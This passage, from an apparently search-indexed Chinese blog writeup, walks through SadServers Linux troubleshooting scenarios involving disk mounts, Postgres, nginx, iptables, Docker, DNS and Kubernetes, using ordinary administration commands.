kernel: [ 946.124665] XFS (nvme0n1): Unmounting Filesystem Nov 3 12:02:07 ip-172-31-25-11 systemd[1]: opt-pgdata.mount: Succeeded. Nov 3 12:02:07 ip-172-31-25-11 systemd[1]: Unmounted /opt/pgdata. \u53ef\u4ee5\u770b\u51fa systemd \u4e0d\u8ba9\u6211\u4eec\u6302\u8f7d\u5230 /opt/pgdata \u4e0a\uff0c\u56e0\u4e3a\u5b83\u548c /dev/xvdb \u8bbe\u5907\u5173\u8054\u4e86\u3002\u8fd9\u4e2a\u5173\u8054\u662f\u5728 /etc/fstab \u6587\u4ef6\u4e2d\u7684\uff1a # /etc/fstab: static file system information UUID=5db68868-2d70-449f-8b1d-f3c769ec01c7 / ext4 rw,discard,errors=remount-ro,x-systemd.growfs 0 1 UUID=72C9-F191 /boot/efi vfat defaults 0 0 /dev/xvdb /opt/pgdata xfs defaults,nofail 0 0 \u628a\u91cc\u9762\u7684 /dev/xvdb \u6362\u6210 /dev/nvme0n1\uff0c\u7136\u540e systemctl daemon-reload \u91cd\u65b0\u52a0\u8f7d\u914d\u7f6e\u6587\u4ef6\u3002\u4e4b\u540e\u5c31\u53ef\u4ee5\u6b63\u5e38 mount \u4e86\uff1a root@ip-172-31-25-11:/# systemctl daemon-reload root@ip-172-31-25-11:/# ls /opt/pgdata root@ip-172-31-25-11:/# mount /dev/nvme0n1 /opt/pgdata root@ip-172-31-25-11:/# ls /opt/pgdata deleteme file1.bk file2.bk file3.bk main \u540c\u6837\uff0c\u8fd9\u4e9b .bk \u6587\u4ef6\u5360\u6ee1\u4e86\u7a7a\u95f4\uff0c\u5220\u6389\u7136\u540e\u91cd\u542f postgresql\uff0c\u5c31\u53ef\u4ee5\u6b63\u5e38\u4f7f\u7528\u4e86\uff1a root@ip-172-31-25-11:/# ls -l /opt/pgdata total 8285620 -rw-r--r-- 1 root root 69 May 21 22:20 deleteme -rw-r--r-- 1 root root 7516192768 May 21 22:06 file1.bk -rw-r--r-- 1 root root 967774208 May 21 22:17 file2.bk -rw-r--r-- 1 root root 499712 May 21 22:23 file3.bk drwx------ 19 postgres postgres 4096 May 21 22:24 main root@ip-172-31-25-11:/# rm /opt/pgdata/file*.bk root@ip-172-31-25-11:/# sudo systemctl start postgresql root@ip-172-31-25-11:/# sudo -u postgres psql -c \"insert into persons(name) values ('jane smith');\" -d dt INSERT 0 1 \"Venice\" \u00b6 Scenario: \"Venice\": Am I in a container? Level: Medium Description: Try and figure out if you are inside a container (like a Docker one for example) or inside a Virtual Machine (like in the other scenarios). OS: Debian 11 emmm\uff0cps -aux \u770b\u5230\uff1a root@ip-172-31-33-228:/# ps -aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.4 2.0 100712 9600 ? Ss 12:14 0:01 /sbin/init root 22 0.0 1.4 26728 6912 ? Ss 12:14 0:00 /lib/systemd/systemd-journald message+ 47 0.0 0.7 8268 3700 ? Ss 12:14 0:00 /usr/bin/dbus-daemon --system --addres root 49 0.0 1.1 13404 5532 ? Ss 12:14 0:00 /lib/systemd/systemd-logind root 71 0.0 2.4 1230092 11584 ? S<sl 12:14 0:00 /usr/local/gotty --permit-write --reco root 91 0.0 0.7 6056 3652 pts/0 S<s 12:18 0:00 bash root 92 0.0 0.7 8840 3416 pts/0 R<+ 12:18 0:00 ps -aux \u548c\u5176\u5b83\u9898\u76ee\u5b9e\u4f8b\u91cc\u9762\u4e0d\u4e00\u6837\uff0c\u6ca1\u6709 kernel thread\uff0c\u6240\u4ee5\u662f\u5bb9\u5668\u800c\u4e0d\u662f\u865a\u62df\u673a\u3002\uff08\u5c31\u8fd9\uff1f \u9898\u7ed9\u7b54\u6848 Solution: This is in fact a Podman container :-) You can get the image: docker.io/fduran/venice. A way of checking is by looking at the environment of the PID=1 process and see if there's a container variable, for ex: cat /proc/1/environ|tr \"\\0\" \"\\n\"|grep container , in our case would be container=podman but I changed its value. An indicator is to look at the running processes and see that there are no kernel threads like [kthreadd].","title":"SadServers"},{"location":"writeups/sadservers/#sadservers-writeup","text":"Abstract \u6c34 tg \u53d1\u73b0\u7684\uff0c\u633a\u597d\u73a9\u7684\uff0c\u5c31\u505a\u4e00\u505a\uff0c\u5b66\u5230\u5f88\u591a\uff0c\u5c31\u5199\u4e00\u5199\u3002 \u5e73\u53f0\u5730\u5740\u5728 https://sadservers.com/ \u3002\u5927\u6982\u7c7b\u4f3c\u8fd0\u7ef4\uff1f\u53cd\u6b63\u5927\u6982\u5c31\u662f\u4fee\u590d\u4e00\u4e9b Linux \u670d\u52a1\u5668\u51fa\u73b0\u7684\u95ee\u9898\u3002 \u4e0d\u7b97 CTF\uff0c\u4e0d\u77e5\u9053\u548b\u5206\u7c7b\uff0c\u5c31\u6254\u8fd9\u91cc\u5427 \u770b\u8d77\u6765\u9898\u76ee\u4e0d\u591a\uff0c\u636e\u8bf4\u662f \"new challenges weekly\"\uff0c\u51fa\u7684\u8bdd\u6216\u8bb8\u53ef\u4ee5\u968f\u65f6\u66f4\u65b0\uff1f\uff08\u5495\u5495\u5495","title":"SadServers Writeup"},{"location":"writeups/sadservers/#saint-john","text":"Scenario: \"Saint John\": what is writing to this log file? Level: Easy Description: A developer created a testing program that is continuously writing to a log file /var/log/bad.log and filling up disk. You can check for example with tail -f /var/log/bad.log . This program is no longer needed. Find it and terminate it. OS: Ubuntu 22.04 LTS \u53ef\u4ee5 tail -f /var/log/bad.log \u770b\u4e00\u773c\u786e\u5b9e\u5728\u4e00\u76f4\u586b\u4e1c\u897f\u3002\u7136\u540e\u5f53\u7136\u662f\u5148\u67e5\u4e00\u4e0b\u540e\u53f0\u8fdb\u7a0b ps -aux\uff0c\u53ef\u4ee5\u53d1\u73b0\u6709\u4e00\u6761\u5f88\u53ef\u7591\uff1a USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ... ubuntu 610 0.0 1.7 17672 8212 ? S 07:57 0:00 /usr/bin/python3 /home/ubuntu/badlog.py ... \u53ef\u4ee5 cat \u770b\u4e00\u4e0b badlog.py: #! /usr/bin/python3 # test python writing to a file import random import time from datetime import datetime f = open ( '/var/log/bad.log' , 'a' ) while True : r = random . randrange ( 2147483647 ) f . write ( str ( datetime . now ()) + ' token: ' + str ( r ) + ' \\n ' ) f . flush () time . sleep ( 1 ) \u786e\u5b9e\u662f\u5728\u6bcf\u4e00\u79d2\u5199\u4e00\u884c\u3002\u6240\u4ee5\u76f4\u63a5 kill -9 610 \u5f3a\u5236\u6740\u6b7b\u8fd9\u4e2a\u8fdb\u7a0b\u5c31\u597d\u4e86\u3002 \u9898\u76ee\u7684\u672c\u610f\u5927\u6982\u662f\u7528 lsof \u6765\u67e5\u770b\u4f7f\u7528\u67d0\u4e00\u6587\u4ef6\u7684\u8fdb\u7a0b\uff1a ubuntu@ip-172-31-32-108:/$ lsof /var/log/bad.log COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME badlog.py 610 ubuntu 3w REG 259,1 31275 67701 /var/log/bad.log \u7136\u540e\u540c\u6837\u662f\u5f3a\u6740\u3002","title":"\"Saint John\""},{"location":"writeups/sadservers/#saskatoon","text":"Scenario: \"Saskatoon\": counting IPs. Level: Easy Description: There's a web server access log file at /home/admin/access.log. The file consists of one line per HTTP request, with the requester's IP address at the beginning of each line. Find what's the IP address that has the most requests in this file (there's no tie; the IP is unique). Write the solution into a file /home/admin/highestip.txt. For example, if your solution is \"1.2.3.4\", you can do echo \"1.2.3.4\" > /home/admin/highestip.txt OS: Debian 11 \u6240\u6709\u9700\u8981\u7684\u4e1c\u897f\u90fd\u5728 access.log \u91cc\u9762\uff0c\u6240\u4ee5\u5199\u4e00\u4e2a python \u811a\u672c\u8bfb\u53d6\u3001\u7edf\u8ba1\u3001\u6392\u5e8f\u3001\u8f93\u51fa\u5c31\u597d\u4e86\uff1a with open ( \"/home/admin/access.log\" , \"r\" ) as f : contents = f . readlines () ips = [ line . split ( \" \" )[ 0 ] for line in contents ] cnt = list ( set ([( ips . count ( ip ), ip ) for ip in ips ])) print ( sorted ( cnt )[ - 1 ]) # (482, '66.249.73.135') \u6240\u4ee5\u8bf7\u6c42\u6700\u591a\u7684 ip \u5c31\u662f 66.249.73.135\u3002 \u5f53\u7136\u9898\u76ee\u7684\u610f\u601d\u662f\u901a\u8fc7 shell \u547d\u4ee4\u76f4\u63a5\u6765\u505a\u3002\u53ef\u4ee5 cat \u7136\u540e cut \u6765\u53d6\u51fa ip\uff0c\u7136\u540e sort | uniq -c \u6765\u7edf\u8ba1\u6b21\u6570\uff08\u8981\u5148 sort\uff0cuniq \u53ea\u4f1a\u7edf\u8ba1\u76f8\u90bb\u7684\u91cd\u590d\u884c\uff09\uff0c\u4e4b\u540e\u5728 sort \u4e00\u4e0b\uff0c\u6700\u540e\u4e00\u884c\u5c31\u662f\u8981\u7684\u4e86\uff1a $ cat /home/admin/access.log | cut -d ' ' -f 1 | sort | uniq -c | sort | tail -n 1 482 66.249.73.135 \u7528 awk \u6765\u5904\u7406\u4e5f\u5f88\u65b9\u4fbf\uff0c\u76f4\u63a5\u4e00\u884c\u89e3\u51b3\uff1a $ awk '{print $1}' /home/admin/access.log | sort | uniq -c | sort | tail -n 1 | awk '{print $2}' > /home/admin/highestip.txt","title":"\"Saskatoon\""},{"location":"writeups/sadservers/#tokyo","text":"Scenario: \"Tokyo\": can't serve web file Level: Medium Description: There's a web server serving a file /var/www/html/index.html with content \"hello sadserver\" but when we try to check it locally with an HTTP client like curl 127.0.0.1:80, nothing is returned. This scenario is not about the particular web server configuration and you only need to have general knowledge about how web servers work. OS: Ubuntu 22.04 LTS ps -aux \u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a web server \u670d\u52a1\u662f\u7531 apache2 \u63d0\u4f9b\u7684\uff1a USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ... www-data 774 0.0 0.9 1211728 4304 ? Sl 08:27 0:00 /usr/sbin/apache2 -k start www-data 775 0.0 0.9 1211728 4304 ? Sl 08:27 0:00 /usr/sbin/apache2 -k start ... \u53bb /etc/apache2 \u901b\u4e86\u4e00\u5708\uff0c\u786e\u5b9e\u6ca1\u4ec0\u4e48\u95ee\u9898\u3002 curl -v 127.0.0.1:80 \uff0c\u53d1\u73b0\u6839\u672c\u5c31\u8fde\u4e0d\u4e0a\u3002\u53ef\u80fd\u662f\u9632\u706b\u5899\u7684\u95ee\u9898\uff0c\u770b\u4e00\u4e0b iptables\uff1a # iptables -L -n Chain INPUT (policy ACCEPT) target prot opt source destination DROP tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:80 Chain FORWARD (policy ACCEPT) target prot opt source destination Chain OUTPUT (policy ACCEPT) target prot opt source destination \u53d1\u73b0 INPUT \u94fe\u628a\u6240\u6709 tcp \u5305\u90fd DROP \u4e86\u3002\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u60c5\u51b5\u89c4\u5219\uff1a # iptables -F \u7136\u540e\u518d curl \u53d1\u73b0\u8fd4\u56de 403 Forbidden\u3002\u68c0\u67e5\u4e00\u4e0b /var/www/html/index.html \u7684\u6743\u9650\uff1a # ls -l /var/www/html/index.html -rw------- 1 root root 16 Aug 1 00:40 /var/www/html/index.html \u6240\u4ee5\u9700\u8981\u4fee\u6539\u4e00\u4e0b\u6743\u9650\uff0c\u8ba9\u6240\u6709\u4eba\u53ef\u8bfb\uff1a # chmod +r /var/www/html/index.html \u7136\u540e\u518d curl \u5c31\u53ef\u4ee5\u4e86\u3002","title":"\"Tokyo\""},{"location":"writeups/sadservers/#manhattan","text":"Scenario: \"Manhattan\": can't write data into database. Level: Medium Description: Your objective is to be able to insert a row in an existing Postgres database. The issue is not specific to Postgres and you don't need to know details about it (although it may help). Helpful Postgres information: it's a service that listens to a port (:5432) and writes to disk in a data directory, the location of which is defined in the data_directory parameter of the configuration file /etc/postgresql/14/main/postgresql.conf. In our case Postgres is managed by systemd as a unit with name postgresql. OS: Debian 10 \u6709\u4e00\u4e9b\u96be\u5ea6\uff0c\u770b\u4e86\u4e9b\u63d0\u793a\u3002 \u9996\u5148 systemctl status postgresql \u53ef\u4ee5\u770b\u51fa postgresql \u786e\u5b9e\u5728\u8fd0\u884c\uff0c\u4f46\u662f\u8fde\u4e0d\u4e0a\u3002\u770b\u4e00\u770b /var/log/syslog \u6ca1\u6709\u4ec0\u4e48\u5f02\u6837\u3002 \u8bd5\u7740 systemctl restart postgresql \u91cd\u542f postgresql\uff0c\u6ca1\u6709\u62a5\u9519\uff0c\u4f46\u662f /var/log/syslog \u91cc\u9762\u53ef\u4ee5\u770b\u5230\u9519\u8bef\uff1a Nov 3 09:11:58 ip-172-31-47-134 postgresql@14-main[884]: 2022-11-03 09:11:58.882 UTC [889] FATAL: could not create lock file \"postmaster.pid\": No space left on device No space left on device\uff0c\u6240\u4ee5 df \u770b\u4e00\u4e0b\u78c1\u76d8\u7528\u91cf\uff1a root@ip-172-31-47-134:/# df Filesystem 1K-blocks Used Available Use% Mounted on udev 229200 0 229200 0% /dev tmpfs 47660 1520 46140 4% /run /dev/nvme1n1p1 8026128 1233676 6363196 17% / tmpfs 238300 0 238300 0% /dev/shm tmpfs 5120 0 5120 0% /run/lock tmpfs 238300 0 238300 0% /sys/fs/cgroup /dev/nvme1n1p15 126710 278 126432 1% /boot/efi /dev/nvme0n1 8378368 8378340 28 100% /opt/pgdata \u53ef\u4ee5\u770b\u5230\u6302\u8f7d\u5728 /opt/pgdata \u4e0a\u7684\u8bbe\u5907\u5bb9\u91cf\u6ee1\u4e86\u3002\u68c0\u67e5\u4e00\u4e0b\u8fd9\u4e2a\u76ee\u5f55\uff1a root@ip-172-31-47-134:/# ls -l /opt/pgdata total 8285620 -rw-r--r-- 1 root root 69 May 21 22:20 deleteme -rw-r--r-- 1 root root 7516192768 May 21 22:06 file1.bk -rw-r--r-- 1 root root 967774208 May 21 22:17 file2.bk -rw-r--r-- 1 root root 499712 May 21 22:23 file3.bk drwx------ 19 postgres postgres 4096 May 21 22:24 main \u53ef\u4ee5\u53d1\u73b0\u4e00\u5806 .bk \u5907\u4efd\u6587\u4ef6\u5360\u6ee1\u4e86\u78c1\u76d8\uff0c\u5220\u9664\u3001\u91cd\u542f\u3001\u6d4b\u8bd5\uff0c\u53d1\u73b0\u4e00\u5207\u6b63\u5e38\u4e86\uff1a root@ip-172-31-47-134:/# rm /opt/pgdata/file*.bk root@ip-172-31-47-134:/# ls -l /opt/pgdata total 8 -rw-r--r-- 1 root root 69 May 21 22:20 deleteme drwx------ 19 postgres postgres 4096 May 21 22:24 main root@ip-172-31-47-134:/# systemctl restart postgresql root@ip-172-31-47-134:/# sudo -u postgres psql -c \"insert into persons(name) values ('jane smith');\" -d dt INSERT 0 1","title":"\"Manhattan\""},{"location":"writeups/sadservers/#cape-town","text":"Scenario: \"Cape Town\": Borked Nginx Level: Medium Description: There's an Nginx web server installed and managed by systemd. Running curl -I 127.0.0.1:80 returns curl: (7) Failed to connect to localhost port 80: Connection refused , fix it so when you curl you get the default Nginx page. OS: Debian 11 \u9996\u5148 systemctl status nginx \u68c0\u67e5\u4e00\u4e0b nginx \u8fd0\u884c\u72b6\u6001\uff1a $ sudo systemctl status nginx \u25cf nginx.service - The NGINX HTTP and reverse proxy server Loaded: loaded (/etc/systemd/system/nginx.service; enabled; vendor preset: enabled) Active: failed (Result: exit-code) since Thu 2022-11-03 09:30:47 UTC; 42s ago Process: 584 ExecStartPre=/usr/sbin/nginx -t (code=exited, status=1/FAILURE) CPU: 28ms Nov 03 09:30:47 ip-172-31-33-45 systemd[1]: Starting The NGINX HTTP and reverse proxy server... Nov 03 09:30:47 ip-172-31-33-45 nginx[584]: nginx: [emerg] unexpected \";\" in /etc/nginx/sites-enabled/default:1 Nov 03 09:30:47 ip-172-31-33-45 nginx[584]: nginx: configuration file /etc/nginx/nginx.conf test failed Nov 03 09:30:47 ip-172-31-33-45 systemd[1]: nginx.service: Control process exited, code=exited, status=1/FAILURE Nov 03 09:30:47 ip-172-31-33-45 systemd[1]: nginx.service: Failed with result 'exit-code'. Nov 03 09:30:47 ip-172-31-33-45 systemd[1]: Failed to start The NGINX HTTP and reverse proxy server. \u53d1\u73b0\u6709\u62a5\u9519\uff0c\u8bf4\u5728 /etc/nginx/sites-enabled/default:1 \u6709\u4e00\u4e2a unexpected \";\"\uff0c\u6240\u4ee5\u53bb\u5220\u6389\u5b83\uff0c\u7136\u540e\u91cd\u542f\u3002 admin@ip-172-31-33-45:/$ sudo vim /etc/nginx/sites-enabled/default admin@ip-172-31-33-45:/$ sudo systemctl restart nginx admin@ip-172-31-33-45:/$ sudo systemctl status nginx \u25cf nginx.service - The NGINX HTTP and reverse proxy server Loaded: loaded (/etc/systemd/system/nginx.service; enabled; vendor preset: enabled) Active: active (running) since Thu 2022-11-03 09:32:32 UTC; 6s ago Process: 868 ExecStartPre=/usr/sbin/nginx -t (code=exited, status=0/SUCCESS) Process: 869 ExecStart=/usr/sbin/nginx (code=exited, status=0/SUCCESS) Main PID: 870 (nginx) Tasks: 2 (limit: 524) Memory: 2.4M CPU: 27ms CGroup: /system.slice/nginx.service \u251c\u2500870 nginx: master process /usr/sbin/nginx \u2514\u2500871 nginx: worker process Nov 03 09:32:32 ip-172-31-33-45 systemd[1]: Starting The NGINX HTTP and reverse proxy server... Nov 03 09:32:32 ip-172-31-33-45 nginx[868]: nginx: the configuration file /etc/nginx/nginx.conf syntax is ok Nov 03 09:32:32 ip-172-31-33-45 nginx[868]: nginx: configuration file /etc/nginx/nginx.conf test is successful Nov 03 09:32:32 ip-172-31-33-45 systemd[1]: Started The NGINX HTTP and reverse proxy server. \u5de5\u4f5c\u6b63\u5e38\uff0c\u4f46\u662f curl \u4e00\u4e0b\u4f1a\u5f97\u5230 500\u3002\u68c0\u67e5\u4e00\u4e0b log\uff1a admin@ip-172-31-33-45:/$ cat /var/log/nginx/error.log | tail -n 10 2022/09/11 16:39:11 [emerg] 5875#5875: unexpected \";\" in /etc/nginx/sites-enabled/default:1 2022/09/11 16:54:26 [emerg] 5931#5931: unexpected \";\" in /etc/nginx/sites-enabled/default:1 2022/09/11 16:55:00 [emerg] 5961#5961: unexpected \";\" in /etc/nginx/sites-enabled/default:1 2022/09/11 17:02:07 [emerg] 6066#6066: unexpected \";\" in /etc/nginx/sites-enabled/default:1 2022/09/11 17:07:03 [emerg] 6146#6146: unexpected \";\" in /etc/nginx/sites-enabled/default:1 2022/11/03 09:30:47 [emerg] 584#584: unexpected \";\" in /etc/nginx/sites-enabled/default:1 2022/11/03 09:32:32 [alert] 870#870: socketpair() failed while spawning \"worker process\" (24: Too many open files) 2022/11/03 09:32:32 [emerg] 871#871: eventfd() failed (24: Too many open files) 2022/11/03 09:32:32 [alert] 871#871: socketpair() failed (24: Too many open files) 2022/11/03 09:33:03 [crit] 871#871: *1 open() \"/var/www/html/index.nginx-debian.html\" failed (24: Too many open files), client: 127.0.0.1, server: _, request: \"GET / HTTP/1.1\", host: \"127.0.0.1\" \u53ef\u4ee5\u53d1\u73b0\u62a5\u9519 Too many open files\u3002\u641c\u4e86\u4e00\u4e0b\uff0c\u7f51\u4e0a\u63d0\u4f9b\u7684\u65b9\u6cd5\u90fd\u8bd5\u4e86\u4e00\u5708\uff0c\u95ee\u9898\u4e0d\u51fa\u5728 nginx \u7684\u914d\u7f6e\u4e0a\u3002\u7136\u540e\u6839\u636e\u63d0\u793a\u53bb\u770b\u4e86 systemd \u4e0a nginx \u7684\u914d\u7f6e\uff1a admin@ip-172-31-33-45:/$ cat /etc/systemd/system/nginx.service [Unit] Description=The NGINX HTTP and reverse proxy server After=syslog.target network-online.target remote-fs.target nss-lookup.target Wants=network-online.target [Service] Type=forking PIDFile=/run/nginx.pid ExecStartPre=/usr/sbin/nginx -t ExecStart=/usr/sbin/nginx ExecReload=/usr/sbin/nginx -s reload ExecStop=/bin/kill -s QUIT $MAINPID PrivateTmp=true LimitNOFILE=10 [Install] WantedBy=multi-user.target \u628a LimitNOFILE=10 \u6539\u6210 LimitNOFILE=1024\uff0c\u7136\u540e\u91cd\u542f nginx \u5373\u53ef\u6b63\u5e38\u5f97\u5230\u54cd\u5e94\uff1a admin@ip-172-31-33-45:/$ sudo systemctl restart nginx Warning: The unit file, source configuration file or drop-ins of nginx.service changed on disk. Run 'systemctl daemon-reload' to reload units. admin@ip-172-31-33-45:/$ sudo systemctl daemon-reload admin@ip-172-31-33-45:/$ sudo systemctl restart nginx admin@ip-172-31-33-45:/$ curl -Is 127.0.0.1:80 | head -1 HTTP/1.1 200 OK","title":"\"Cape Town\""},{"location":"writeups/sadservers/#salta","text":"Scenario: \"Salta\": Docker container won't start. Level: Medium Description: There's a \"dockerized\" Node.js web application in the /home/admin/app directory. Create a Docker container so you get a web app on port :8888 and can curl to it. For the solution to be valid, there should be only one running Docker container. OS: Debian 11 \u9996\u5148\u68c0\u67e5\u4e00\u4e0b docker \u5bb9\u5668\uff1a admin@ip-172-31-38-21:/$ sudo docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 124a4fb17a1c app \"docker-entrypoint.s\u2026\" 6 weeks ago Exited (1) 6 weeks ago elated_taussig admin@ip-172-31-38-21:~/app$ sudo docker logs 124 node:internal/modules/cjs/loader:928 throw err; ^ Error: Cannot find module '/usr/src/app/serve.js' at Function.Module._resolveFilename (node:internal/modules/cjs/loader:925:15) at Function.Module._load (node:internal/modules/cjs/loader:769:27) at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:76:12) at node:internal/main/run_main_module:17:47 { code: 'MODULE_NOT_FOUND', requireStack: [] } \u53d1\u73b0\u62a5\u9519\u4e86\uff0cDockerfile \u91cc\u51fa\u4e86\u4e00\u4e9b\u95ee\u9898\uff0c\u770b\u4e00\u4e0b\uff1a # documentation https://nodejs.org/en/docs/guides/nodejs-docker-webapp/ # most recent node (security patches) and alpine (minimal, adds to security, possible libc issues) FROM node:15.7-alpine # Create app directory & copy app files WORKDIR /usr/src/app # we copy first package.json only, so we take advantage of cached Docker layers COPY ./package*.json ./ # RUN npm ci --only=production RUN npm install # Copy app source COPY ./* ./ # port used by this app EXPOSE 8880 # command to run CMD [ \"node\" , \"serve.js\" ] \u53d1\u73b0\u6700\u540e CMD \u91cc server.js \u6253\u6210\u4e86 serve.js\uff0c\u800c\u4e14 EXPOSE \u7684\u7aef\u53e3\u4e5f\u4e0d\u5bf9\u3002\u4e24\u4e2a\u95ee\u9898\u4fee\u4e00\u4e0b\u7136\u540e\u91cd\u65b0\u6784\u5efa\u3001\u8fd0\u884c\uff1a admin@ip-172-31-38-21:~/app$ sudo docker build -t app . admin@ip-172-31-38-21:~/app$ sudo docker rm 124 admin@ip-172-31-38-21:~/app$ sudo docker run -d -p 8888:8888 app e67b36ff14ff3676e419036180abf9231e97eacc5ec6fe9d76426e7003acfb8f docker: Error response from daemon: driver failed programming external connectivity on endpoint nifty_bhaskara (ce8a09c7a42f730b89e0bd1bd3298de1598d79bf0d08d1532a7f38002cda84d4): Error starting userland proxy: listen tcp4 0.0.0.0:8888: bind: address already in use. \u53d1\u73b0\u62a5\u9519 8888 \u7aef\u53e3\u88ab\u5360\u7528\u4e86\u3002\u6ca1\u6709 lsof\uff0c\u7528 netstat \u67e5\u4e00\u4e0b\u7aef\u53e3\uff1a admin@ip-172-31-38-21:~/app$ netstat -tunlp (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:8888 0.0.0.0:* LISTEN - tcp6 0 0 :::8080 :::* LISTEN 562/gotty tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::8888 :::* LISTEN - tcp6 0 0 :::6767 :::* LISTEN 563/sadagent udp 0 0 127.0.0.1:323 0.0.0.0:* - udp 0 0 0.0.0.0:68 0.0.0.0:* - udp6 0 0 fe80::8d3:45ff:fee9:546 :::* - udp6 0 0 ::1:323 :::* - \u53d1\u73b0 8888 \u7aef\u53e3\u5728\u7528\uff0cps -aux \u53ef\u4ee5\u770b\u5230\u6709\u4e00\u4e2a nginx \u5728\u8fd0\u884c\uff0c\u5728 /etc/nginx/sites-enabled/default \u91cc\u786e\u5b9e\u6709\u4f7f\u7528 8888 \u7aef\u53e3\u3002 \u6240\u4ee5\u5148\u505c\u6389 nginx\uff0c\u7136\u540e\u91cd\u65b0\u90e8\u7f72\u5bb9\u5668\u5373\u53ef\uff1a admin@ip-172-31-38-21:~/app$ sudo systemctl stop nginx admin@ip-172-31-38-21:~/app$ sudo docker stop e6 e6 admin@ip-172-31-38-21:~/app$ sudo docker rm e6 e6 admin@ip-172-31-38-21:~/app$ sudo docker run -d -p 8888:8888 app ... admin@ip-172-31-38-21:~/app$ curl localhost:8888 Hello World!","title":"\"Salta\""},{"location":"writeups/sadservers/#jakarta","text":"Scenario: \"Jakarta\": it's always DNS. Level: Hard Description: Can't ping google.com. It returns ping: google.com: Name or service not known. Expected is being able to resolve the hostname. (Note: currently the VMs can't ping outside so there's no automated check for the solution). OS: Ubuntu 22.04 LTS \u6839\u636e\u9898\u76ee\u77e5\u9053\u662f dns \u51fa\u4e86\u95ee\u9898\uff0c/etc/resolv.conf \u91cc\u7684\u914d\u7f6e\u90fd\u6ca1\u5565\u95ee\u9898\u3002\u800c\u4e14\u6574\u4e2a sadservers \u662f\u4e0d\u80fd\u8fde\u63a5\u5916\u7f51\u7684\uff0c\u6240\u4ee5\u5927\u6982\u53ea\u80fd\u7528\u672c\u673a\u7684\u4e86\u3002\u641c\u7d22\u4e86\u4e00\u4e0b dns \u76f8\u5173\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u770b\u4e86\u4e00\u5708\u53d1\u73b0 /etc/nsswitch.conf \u91cc\u7684 hosts \u914d\u7f6e\u6709\u95ee\u9898\uff1a hosts: files \u800c\u7f51\u4e0a\u7684\u4f8b\u5b50\u91cc\u90fd\u6709 dns\uff0c\u6240\u4ee5\u5728 files \u540e\u9762\u52a0\u4e00\u4e2a dns \u5c31\u53ef\u4ee5\u4e86\uff1a ubuntu@ip-172-31-42-233:/$ ping google.com PING google.com (142.250.191.174) 56(84) bytes of data.","title":"\"Jakarta\""},{"location":"writeups/sadservers/#bern","text":"Scenario: \"Bern\": Docker web container can't connect to db container. Level: Hard Description: There are two Docker containers running, a web application (Wordpress or WP) and a database (MariaDB) as back-end, but if we look at the web page, we see that it cannot connect to the database. curl -s localhost:80 |tail -4 returns: < body id = \"error-page\" > < div class = \"wp-die-message\" >< h1 > Error establishing a database connection </ h1 ></ div ></ body > </ html > This is not a Wordpress code issue (the image is :latest with some network utilities added). What you need to know is that WP uses \"WORDPRESS_DB_\" environment variables to create the MySQL connection string. See the ./html/wp-config.php WP config file for example (from /home/admin). OS: Debian 11 docker ps -a \u53ef\u4ee5\u770b\u5230\u6709\u4e24\u4e2a\u5bb9\u5668\u5728\u8fd0\u884c\u3002\u6839\u636e\u9898\u76ee\u7684 test \u53ef\u4ee5\u77e5\u9053 mysql \u7684\u8d26\u53f7\u5bc6\u7801\u662f root:password\u3002 WordPress \u542f\u52a8\u4f1a\u4ece\u73af\u5883\u53d8\u91cf\u8bfb\u53d6\u914d\u7f6e\uff0c\u6240\u4ee5\u5728 wordpress \u7684\u5bb9\u5668\u4e2d\u67e5\u4e00\u4e0b env\uff1a admin@ip-172-31-19-232:/$ sudo docker exec wordpress env |grep WORDPRESS_DB_ WORDPRESS_DB_PASSWORD=password WORDPRESS_DB_USER=root \u53ef\u4ee5\u770b\u51fa\u7528\u6237\u540d\u548c\u5bc6\u7801\u8bbe\u7f6e\u7684\u662f\u6b63\u786e\u7684\u3002\u4f46\u662f NAME \u548c HOST \u4f7f\u7528\u7684\u5c31\u662f wp-config.php \u4e2d\u9ed8\u8ba4\u7684\u4e86\uff0c\u4e5f\u5c31\u662f wordpress \u548c mysql\uff0cNAME \u7684\u8bdd\u5728 mariadb \u5bb9\u5668\u91cc\u53ef\u4ee5\u770b\u5230\u786e\u5b9e\u662f wordpress\uff0c\u4f46 HOST \u662f mysql\uff0c\u5c31\u8fde\u63a5\u4e0d\u5230\u4e86\u3002 \u800c\u9898\u7ed9\u7684 test \u4e00\u5b9a\u8981\u5728 wordpress \u5bb9\u5668\u91cc\u6253\u5f00 mysqladmin\uff0c\u8fde\u63a5 host mysql\u3002\u4e0d\u77e5\u9053\u600e\u4e48\u641e qwq\uff0chint \u6ca1\u518d\u63a5\u7740\u5199\u4e86\uff0c\u516b\u4f1a qwq\u3002","title":"\"Bern\""},{"location":"writeups/sadservers/#singara","text":"Scenario: \"Singara\": Docker and Kubernetes web app not working. Level: Hard Description: There's a k3s Kubernetes install you can access with kubectl. The Kubernetes YAML manifests under /home/admin have been applied. The objective is to access from the host the \"webapp\" web server deployed and find what message it serves (it's a name of a town or city btw). In order to pass the check, the webapp Docker container should not be run separately outside Kubernetes as a shortcut. OS: Debian 11 \u5148\u770b\u4e00\u4e0b k3s \u7684\u914d\u7f6e\u6587\u4ef6\uff1a \u914d\u7f6e\u6587\u4ef6 deployment.yml apiVersion : apps/v1 kind : Deployment metadata : name : webapp-deployment namespace : web spec : selector : matchLabels : app : webapp replicas : 1 template : metadata : labels : app : webapp spec : containers : - name : webapp image : webapp imagePullPolicy : Always ports : - containerPort : 8880 namespace.yml apiVersion : v1 kind : Namespace metadata : name : web nodeport.yml apiVersion : v1 kind : Service metadata : name : webapp-service namespace : web spec : type : NodePort selector : app.kubernetes.io/name : webapp ports : - port : 80 targetPort : 8888 nodePort : 30007 